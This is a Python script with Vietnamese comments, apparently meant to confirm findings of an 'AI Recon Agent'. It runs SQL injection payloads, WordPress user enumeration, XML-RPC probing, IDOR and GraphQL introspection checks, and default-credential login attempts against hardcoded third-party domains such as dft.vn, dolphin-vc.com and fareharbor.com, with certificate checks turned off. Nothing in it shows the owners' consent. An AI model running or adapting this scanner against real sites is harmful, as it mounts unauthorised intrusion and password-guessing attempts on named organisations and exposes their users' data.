#!/usr/bin/env python3
"""
Vulnerability Verifier Script
Xác nhận các lỗ hổng đã được phát hiện bởi AI Recon Agent
"""

import requests
import sys
import json
import time
from urllib.parse import urljoin, urlparse
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ CẤU HÌNH ============
TIMEOUT = 10
VERBOSE = False
THREADS = 5

# ============ MÀU SẤC CHO OUTPUT ============
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    print(f"""{CYAN}
╔══════════════════════════════════════════════════════════════╗
║     🔍 VULNERABILITY VERIFIER - AI Recon Agent Validator    ║
║     Xác nhận lỗ hổng đã phát hiện                            ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

def print_result(status, title, details=""):
    if status == "PASS":
        print(f"{GREEN}✓ PASS{RESET} - {title}")
    elif status == "FAIL":
        print(f"{RED}✗ FAIL{RESET} - {title}")
        if details:
            print(f"  {YELLOW}→ {details}{RESET}")
    elif status == "INFO":
        print(f"{BLUE}ℹ INFO{RESET} - {title}")
        if details:
            print(f"  {details}")
    elif status == "VULN":
        print(f"{RED}{BOLD}🔥 VULNERABLE{RESET}{RED} - {title}{RESET}")
        if details:
            print(f"  {details}")

# ============ 1. SQL INJECTION VERIFICATION ============
def verify_sqli(url, param="q"):
    """Xác nhận SQL Injection bằng boolean-based technique"""
    test_payloads = [
        ("' OR '1'='1", "' OR '1'='1' -- "),
        ("' AND '1'='1", "' AND '1'='1' -- "),
        ("' OR 1=1--", "' OR 1=1 -- "),
        ("1' AND '1'='1", "1' AND '1'='1"),
        ("1' AND SLEEP(5)--", "1' AND SLEEP(5) -- "),
    ]
    
    original_url = url
    results = []
    
    for payload, encoded_payload in test_payloads:
        test_url = f"{url}?{param}={encoded_payload}"
        try:
            start = time.time()
            resp = requests.get(test_url, timeout=TIMEOUT, verify=False)
            elapsed = time.time() - start
            
            # Check for time-based SQLi
            if elapsed > 3 and "SLEEP" in payload:
                results.append({"payload": payload, "type": "time-based", "time": elapsed})
            
            # Check for boolean-based (error messages, content differences)
            if "mysql" in resp.text.lower() or "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                results.append({"payload": payload, "type": "error-based"})
                
        except Exception as e:
            pass
    
    return len(results) > 0, results

# ============ 2. USER ENUMERATION VERIFICATION ============
def verify_user_enumeration(base_url):
    """Xác nhận user enumeration qua WordPress REST API"""
    endpoints = [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/users/",
        "/?author=1",
        "/?author=2",
        "/?author=3",
        "/wp-json/wp/v2/users?per_page=100",
        "/index.php?author=1",
    ]
    
    found_users = []
    
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        try:
            resp = requests.get(url, timeout=TIMEOUT, verify=False)
            
            if resp.status_code == 200:
                if "users" in endpoint:
                    try:
                        data = resp.json()
                        if isinstance(data, list):
                            for user in data:
                                if "name" in user or "username" in user or "slug" in user:
                                    found_users.append({
                                        "id": user.get("id"),
                                        "name": user.get("name"),
                                        "username": user.get("username", user.get("slug")),
                                        "url": url
                                    })
                    except:
                        pass
                elif "author" in endpoint:
                    # Check if page contains author info
                    if "author" in resp.text.lower() or "post by" in resp.text.lower():
                        found_users.append({"url": url, "type": "author_id"})
                        
        except Exception as e:
            pass
    
    return len(found_users) > 0, found_users

# ============ 3. XML-RPC VERIFICATION ============
def verify_xmlrpc(base_url):
    """Xác nhận XML-RPC enabled và kiểm tra methods"""
    xmlrpc_url = urljoin(base_url, "xmlrpc.php")
    
    # Test payload để lấy danh sách methods
    payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
    
    try:
        resp = requests.post(xmlrpc_url, data=payload, timeout=TIMEOUT, 
                            headers={"Content-Type": "text/xml"}, verify=False)
        
        if resp.status_code == 200 and "methodName" in resp.text:
            # Parse methods
            methods = []
            import re
            matches = re.findall(r'<name>(.*?)</name>', resp.text)
            methods = matches[:10]  # Lấy 10 methods đầu
            
            return True, {"methods": methods, "url": xmlrpc_url}
    except:
        pass
    
    return False, {}

# ============ 4. DEFAULT CREDENTIALS VERIFICATION ============
def verify_default_creds(login_urls):
    """Kiểm tra default credentials trên các login pages"""
    default_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("administrator", "admin"),
        ("root", "root"),
        ("user", "user"),
    ]
    
    vulnerable = []
    
    for url in login_urls:
        for username, password in default_creds:
            try:
                # Try POST login
                resp = requests.post(url, data={"log": username, "pwd": password, "wp-submit": "Login"},
                                    timeout=TIMEOUT, verify=False, allow_redirects=False)
                
                # Check for successful login indicators
                if resp.status_code in [302, 301]:
                    if "wp-admin" in resp.headers.get("Location", ""):
                        vulnerable.append({"url": url, "username": username, "password": password})
                        break
                        
                # Check response content
                if "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
                    vulnerable.append({"url": url, "username": username, "password": password})
                    break
                    
            except:
                pass
    
    return len(vulnerable) > 0, vulnerable

# ============ 5. API UNAUTHENTICATED ACCESS ============
def verify_api_access(api_urls):
    """Kiểm tra API endpoints có cho phép truy cập không cần auth không"""
    vulnerable = []
    
    for url in api_urls[:20]:  # Giới hạn 20 URLs
        try:
            resp = requests.get(url, timeout=TIMEOUT, verify=False)
            
            # Check if returns data without auth
            if resp.status_code == 200:
                content_type = resp.headers.get("Content-Type", "")
                
                if "json" in content_type:
                    try:
                        data = resp.json()
                        if data and (isinstance(data, list) or isinstance(data, dict)):
                            vulnerable.append({
                                "url": url,
                                "status": 200,
                                "data_sample": str(data)[:100]
                            })
                    except:
                        pass
                elif len(resp.text) > 50:
                    vulnerable.append({"url": url, "status": 200, "type": "html"})
                    
        except Exception as e:
            pass
    
    return len(vulnerable) > 0, vulnerable

# ============ 6. IDOR VERIFICATION ============
def verify_idor(base_url, params_list):
    """Kiểm tra IDOR trên các parameters"""
    test_ids = [1, 2, 3, 100, 1000, "admin", "root"]
    vulnerable = []
    
    for param in params_list:
        for test_id in test_ids:
            test_url = f"{base_url}?{param}={test_id}"
            try:
                resp = requests.get(test_url, timeout=TIMEOUT, verify=False)
                
                # Check if returns different content for different IDs
                if resp.status_code == 200 and len(resp.text) > 100:
                    vulnerable.append({
                        "url": test_url,
                        "param": param,
                        "test_id": test_id,
                        "status": 200
                    })
                    break
            except:
                pass
    
    return len(vulnerable) > 0, vulnerable

# ============ 7. GRAPHQL INTROSPECTION ============
def verify_graphql_introspection(graphql_url):
    """Kiểm tra GraphQL introspection có bật không"""
    introspection_query = """
    {
      __schema {
        types {
          name
        }
      }
    }
    """
    
    try:
        resp = requests.post(graphql_url, json={"query": introspection_query}, 
                            timeout=TIMEOUT, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            if "data" in data and "__schema" in data["data"]:
                types = data["data"]["__schema"].get("types", [])
                return True, {"types_count": len(types), "url": graphql_url}
    except:
        pass
    
    return False, {}

# ============ 8. README EXPOSED ============
def verify_readme_exposed(base_url):
    """Kiểm tra file readme.html có bị lộ không"""
    readme_url = urljoin(base_url, "readme.html")
    
    try:
        resp = requests.get(readme_url, timeout=TIMEOUT, verify=False)
        
        if resp.status_code == 200:
            if "WordPress" in resp.text and "Version" in resp.text:
                import re
                version_match = re.search(r'Version\s+([\d\.]+)', resp.text)
                version = version_match.group(1) if version_match else "unknown"
                return True, {"url": readme_url, "version": version}
    except:
        pass
    
    return False, {}

# ============ MAIN VERIFICATION FUNCTION ============
def verify_target(target_config):
    """Verify tất cả vulnerabilities cho một target"""
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}🎯 Target: {target_config.get('name', 'Unknown')}{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    
    base_url = target_config.get("base_url", "")
    results = {
        "target": target_config.get("name"),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": {}
    }
    
    # 1. SQL Injection
    if target_config.get("test_sqli", False):
        print(f"\n{BLUE}[1/8] Testing SQL Injection...{RESET}")
        is_vuln, details = verify_sqli(base_url, target_config.get("sqli_param", "q"))
        results["vulnerabilities"]["sql_injection"] = {
            "status": is_vuln,
            "details": details
        }
        print_result("VULN" if is_vuln else "PASS", 
                    f"SQL Injection", 
                    f"Found {len(details)} potential vectors" if is_vuln else "Not vulnerable")
    
    # 2. User Enumeration
    if target_config.get("test_user_enum", False):
        print(f"\n{BLUE}[2/8] Testing User Enumeration...{RESET}")
        is_vuln, users = verify_user_enumeration(base_url)
        results["vulnerabilities"]["user_enumeration"] = {
            "status": is_vuln,
            "users": users
        }
        if is_vuln:
            print_result("VULN", "User Enumeration", f"Found {len(users)} users")
            for user in users[:5]:
                print(f"    └─ User: {user.get('name', user.get('username', 'unknown'))}")
        else:
            print_result("PASS", "User Enumeration", "Not vulnerable")
    
    # 3. XML-RPC
    if target_config.get("test_xmlrpc", False):
        print(f"\n{BLUE}[3/8] Testing XML-RPC...{RESET}")
        is_vuln, details = verify_xmlrpc(base_url)
        results["vulnerabilities"]["xmlrpc"] = {
            "status": is_vuln,
            "details": details
        }
        print_result("VULN" if is_vuln else "INFO", 
                    f"XML-RPC Enabled", 
                    f"Methods: {', '.join(details.get('methods', [])[:5])}" if is_vuln else "Not enabled or accessible")
    
    # 4. Readme Exposed
    if target_config.get("test_readme", False):
        print(f"\n{BLUE}[4/8] Testing Readme Exposure...{RESET}")
        is_vuln, details = verify_readme_exposed(base_url)
        results["vulnerabilities"]["readme_exposed"] = {
            "status": is_vuln,
            "details": details
        }
        print_result("VULN" if is_vuln else "PASS", 
                    f"Readme.html Exposed", 
                    f"WordPress {details.get('version', 'unknown')} exposed" if is_vuln else "Not exposed")
    
    # 5. API Unauthenticated Access
    if target_config.get("api_urls"):
        print(f"\n{BLUE}[5/8] Testing API Unauthenticated Access...{RESET}")
        is_vuln, vulnerable_apis = verify_api_access(target_config.get("api_urls", []))
        results["vulnerabilities"]["api_unauthenticated"] = {
            "status": is_vuln,
            "vulnerable_endpoints": vulnerable_apis
        }
        if is_vuln:
            print_result("VULN", "API Unauthenticated Access", f"Found {len(vulnerable_apis)} accessible APIs")
            for api in vulnerable_apis[:3]:
                print(f"    └─ {api['url']}")
        else:
            print_result("PASS", "API Unauthenticated Access", "All APIs require auth or not accessible")
    
    # 6. IDOR
    if target_config.get("idor_params"):
        print(f"\n{BLUE}[6/8] Testing IDOR...{RESET}")
        is_vuln, vulnerable = verify_idor(base_url, target_config.get("idor_params", []))
        results["vulnerabilities"]["idor"] = {
            "status": is_vuln,
            "vulnerable_endpoints": vulnerable
        }
        print_result("VULN" if is_vuln else "PASS", 
                    f"IDOR Vulnerabilities", 
                    f"Found {len(vulnerable)} potential IDOR vectors" if is_vuln else "Not vulnerable")
    
    # 7. GraphQL Introspection
    if target_config.get("graphql_urls"):
        print(f"\n{BLUE}[7/8] Testing GraphQL Introspection...{RESET}")
        for gql_url in target_config.get("graphql_urls", []):
            is_vuln, details = verify_graphql_introspection(gql_url)
            if is_vuln:
                print_result("VULN", f"GraphQL Introspection - {gql_url}", 
                           f"Schema exposed with {details.get('types_count', 0)} types")
                results["vulnerabilities"]["graphql_introspection"] = {
                    "status": True,
                    "url": gql_url,
                    "details": details
                }
                break
        else:
            print_result("PASS", "GraphQL Introspection", "Not vulnerable or not accessible")
    
    # 8. Default Credentials
    if target_config.get("login_urls"):
        print(f"\n{BLUE}[8/8] Testing Default Credentials...{RESET}")
        is_vuln, vulnerable = verify_default_creds(target_config.get("login_urls", []))
        results["vulnerabilities"]["default_creds"] = {
            "status": is_vuln,
            "vulnerable_logins": vulnerable
        }
        if is_vuln:
            print_result("VULN", "Default Credentials", f"Found {len(vulnerable)} login pages with default creds")
            for cred in vulnerable:
                print(f"    └─ {cred['url']} - {cred['username']}:{cred['password']}")
        else:
            print_result("PASS", "Default Credentials", "No default credentials found")
    
    return results

# ============ TARGET CONFIGURATIONS ============
def get_targets():
    """Cấu hình các target dựa trên log đã phân tích"""
    
    targets = [
        {
            "name": "dft.vn (Main)",
            "base_url": "https://dft.vn",
            "test_sqli": True,
            "sqli_param": "q",
            "test_user_enum": True,
            "test_xmlrpc": True,
            "test_readme": True,
            "api_urls": [
                "https://dft.vn/wp-json/wp/v2/users",
                "https://admin.creator-donation-service-staging.dft.vn/api",
                "https://influxdb.dft.vn/api",
                "https://access.dft.vn/api",
            ],
            "idor_params": ["id", "user_id", "uid", "post_id", "article_id", "profile_id"],
            "graphql_urls": [
                "https://dft.vn/graphql",
                "https://admin.creator-donation-service-staging.dft.vn/graphql",
                "https://influxdb.dft.vn/graphql",
            ],
            "login_urls": [
                "https://dft.vn/wp-login.php",
                "https://dft.vn/admin",
                "https://dft.vn/administrator",
                "https://admin.creator-donation-service-staging.dft.vn/login",
            ]
        },
        {
            "name": "dolphin-vc.com",
            "base_url": "https://dolphin-vc.com",
            "test_sqli": True,
            "sqli_param": "p",
            "test_user_enum": True,
            "test_xmlrpc": True,
            "test_readme": True,
            "api_urls": [
                "https://dolphin-vc.com/wp-json/wp/v2/users",
                "https://dolphin-vc.com/api/products",
                "https://dolphin-vc.com/pcm-to-pdm-bridge/api/products",
            ],
            "idor_params": ["id", "user_id", "post_id"],
            "graphql_urls": [],
            "login_urls": [
                "https://dolphin-vc.com/wp-login.php",
                "https://dolphin-vc.com/admin",
            ]
        },
        {
            "name": "developer.wordpress.org",
            "base_url": "https://developer.wordpress.org",
            "test_sqli": False,  # WordPress.org thường secure
            "test_user_enum": True,
            "test_xmlrpc": True,
            "test_readme": True,
            "api_urls": [
                "https://developer.wordpress.org/wp-json/wp/v2/users",
                "https://developer.wordpress.org/wp-json/",
            ],
            "idor_params": [],
            "graphql_urls": [],
            "login_urls": []
        },
        {
            "name": "fareharbor.com",
            "base_url": "https://fareharbor.com",
            "test_sqli": False,
            "test_user_enum": True,
            "test_xmlrpc": True,
            "test_readme": True,
            "api_urls": [
                "https://fareharbor.com/api",
                "https://developer.fareharbor.com/api",
            ],
            "idor_params": ["id", "item_id"],
            "graphql_urls": [
                "https://fareharbor.com/graphql",
                "https://developer.fareharbor.com/graphql",
            ],
            "login_urls": [
                "https://fareharbor.com/login",
                "https://auth.fareharbor.com",
            ]
        }
    ]
    
    return targets

# ============ GENERATE REPORT ============
def generate_report(all_results):
    """Tạo báo cáo tổng hợp"""
    print(f"\n{PURPLE}{BOLD}{'='*60}{RESET}")
    print(f"{PURPLE}{BOLD}📋 FINAL VERIFICATION REPORT{RESET}")
    print(f"{PURPLE}{BOLD}{'='*60}{RESET}")
    
    total_vulns = 0
    critical_vulns = 0
    
    for result in all_results:
        print(f"\n{CYAN}▶ Target: {result['target']}{RESET}")
        vulns = result.get("vulnerabilities", {})
        
        for vuln_name, vuln_data in vulns.items():
            if vuln_data.get("status"):
                total_vulns += 1
                if vuln_name in ["sql_injection", "default_creds", "api_unauthenticated"]:
                    critical_vulns += 1
                    severity = "CRITICAL"
                elif vuln_name in ["user_enumeration", "xmlrpc"]:
                    severity = "HIGH"
                else:
                    severity = "MEDIUM"
                    
                print(f"  {RED}🔥 [{severity}]{RESET} {vuln_name.replace('_', ' ').title()}")
    
    print(f"\n{GREEN}{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}📊 SUMMARY:{RESET}")
    print(f"  • Total verified vulnerabilities: {RED}{total_vulns}{RESET}")
    print(f"  • Critical/High severity: {RED}{critical_vulns}{RESET}")
    print(f"  • Targets tested: {len(all_results)}")
    print(f"{GREEN}{BOLD}{'='*60}{RESET}")
    
    # Save to file
    with open("verification_report.json", "w") as f:
        json.dump(all_results, f, indent=2)
    print(f"\n{GREEN}✓ Report saved to verification_report.json{RESET}")

# ============ MAIN ============
def main():
    parser = argparse.ArgumentParser(description="Verify vulnerabilities found by AI Recon Agent")
    parser.add_argument("--target", type=str, help="Specific target to verify (dft.vn, dolphin-vc.com, etc)")
    parser.add_argument("--quick", action="store_true", help="Quick mode - only test critical vulns")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    args = parser.parse_args()
    
    global TIMEOUT
    TIMEOUT = args.timeout
    
    print_banner()
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    targets = get_targets()
    
    if args.target:
        targets = [t for t in targets if args.target in t["name"]]
        if not targets:
            print(f"{RED}Error: Target '{args.target}' not found{RESET}")
            sys.exit(1)
    
    all_results = []
    
    for target in targets:
        results = verify_target(target)
        all_results.append(results)
    
    generate_report(all_results)
    
    print(f"\n{YELLOW}⚠️  Note: Some tests may trigger security alerts. Run responsibly.{RESET}")

if __name__ == "__main__":
    main()
